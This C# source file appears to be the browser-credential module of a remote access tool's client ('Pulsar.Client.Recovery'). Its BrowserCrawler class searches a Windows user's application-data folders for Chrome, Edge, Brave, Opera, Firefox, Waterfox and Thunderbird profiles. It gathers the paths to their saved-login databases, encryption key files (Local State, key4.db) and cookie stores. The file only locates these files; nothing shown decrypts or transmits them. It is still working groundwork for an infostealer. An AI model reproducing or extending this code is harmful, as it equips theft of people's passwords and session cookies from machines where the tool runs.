using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Pulsar.Client.Recovery.Browsers
{
    public static class BrowserCrawler
    {
        static readonly (string name, string userDataPath, string localStateRel, string loginDataRel, string cookiesRel)[] chromiumBrowsers =
        {
            ("Chrome",       @"Google\Chrome\User Data", "Local State", @"Login Data",           @"Cookies"),
            ("Edge",         @"Microsoft\Edge\User Data",               "Local State", @"Default\Login Data",    @"Default\Cookies"),
            ("Brave",        @"BraveSoftware\Brave-Browser\User Data",  "Local State", @"Default\Login Data",    @"Default\Cookies"),
            ("Opera",        @"Opera Software\Opera Stable",            "Local State", @"Login Data",            @"Cookies"),
            ("OperaGX",      @"Opera Software\Opera GX Stable",         "Local State", @"Login Data",            @"Cookies"),
            ("OperaGX-Roam", @"Opera Software\Opera GX Stable",         "Local State", @"Default\Login Data",    @"Default\Cookies"),
        };

        static readonly string[] geckoProfileRelPaths =
        {
            @"Mozilla\Firefox\Profiles",
            @"Waterfox\Profiles",
            @"Thunderbird\Profiles"
        };

        public static AllBrowsers CrawlAll()
        {
            var chromes = new List<BrowserChromium>();
            var geckos = new List<BrowserGecko>();

            foreach (var (browser, rel, localState, loginData, cookies) in chromiumBrowsers)
            {
                if (browser == "Chrome")
                {
                    string userDataDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                        rel
                    );
                    if (!Directory.Exists(userDataDir)) continue;

                    var profiles = new List<ProfileChromium>();
                    string profPath = Path.Combine(userDataDir, "Default");
                    if (Directory.Exists(profPath))
                    {
                        profiles.Add(new ProfileChromium
                        {
                            Name = "Default",
                            LoginData = Path.Combine(profPath, "Login Data For Account"),
                            Cookies = Path.Combine(profPath, "Cookies"),
                            Path = profPath
                        });
                    }
                    foreach (var dir in Directory.GetDirectories(userDataDir)
                        .Where(p => Path.GetFileName(p).StartsWith("Profile ")))
                    {
                        profiles.Add(new ProfileChromium
                        {
                            Name = Path.GetFileName(dir),
                            LoginData = Path.Combine(dir, "Login Data For Account"),
                            Cookies = Path.Combine(dir, "Cookies"),
                            Path = dir
                        });
                    }
                    if (profiles.Count > 0)
                    {
                        chromes.Add(new BrowserChromium
                        {
                            Name = browser,
                            Path = userDataDir,
                            LocalState = Path.Combine(userDataDir, localState),
                            Profiles = profiles.ToArray()
                        });
                    }
                    continue;
                }

                foreach (var root in new[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                })
                {
                    string userDataDir = Path.Combine(root, rel);
                    if (!Directory.Exists(userDataDir)) continue;

                    var profiles = new List<ProfileChromium>();
                    if (Directory.Exists(Path.Combine(userDataDir, "Default")))
                    {
                        string profPath = Path.Combine(userDataDir, "Default");
                        profiles.Add(new ProfileChromium
                        {
                            Name = "Default",
                            LoginData = Path.Combine(profPath, "Login Data"),
                            Cookies = Path.Combine(profPath, "Cookies"),
                            Path = profPath
                        });
                    }
                    foreach (var dir in Directory.GetDirectories(userDataDir)
                        .Where(p => Path.GetFileName(p).StartsWith("Profile ")))
                    {
                        profiles.Add(new ProfileChromium
                        {
                            Name = Path.GetFileName(dir),
                            LoginData = Path.Combine(dir, "Login Data"),
                            Cookies = Path.Combine(dir, "Cookies"),
                            Path = dir
                        });
                    }
                    if (profiles.Count > 0)
                    {
                        chromes.Add(new BrowserChromium
                        {
                            Name = browser,
                            Path = userDataDir,
                            LocalState = Path.Combine(userDataDir, localState),
                            Profiles = profiles.ToArray()
                        });
                    }
                }
            }

            foreach (var root in new[] {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            })
            {
                foreach (var rel in geckoProfileRelPaths)
                {
                    string profRoot = Path.Combine(root, rel);
                    if (!Directory.Exists(profRoot)) continue;

                    foreach (var dir in Directory.GetDirectories(profRoot)
                        .Where(d => d.Contains(".default")))
                    {
                        geckos.Add(new BrowserGecko
                        {
                            Name = Path.GetFileName(Path.GetDirectoryName(profRoot)),
                            Path = dir,
                            Key4 = Path.Combine(dir, "key4.db"),
                            Logins = Path.Combine(dir, "logins.json"),
                            ProfilesDir = profRoot
                        });
                    }
                }
            }

            return new AllBrowsers
            {
                Chromium = chromes.ToArray(),
                Gecko = geckos.ToArray()
            };
        }
    }
}
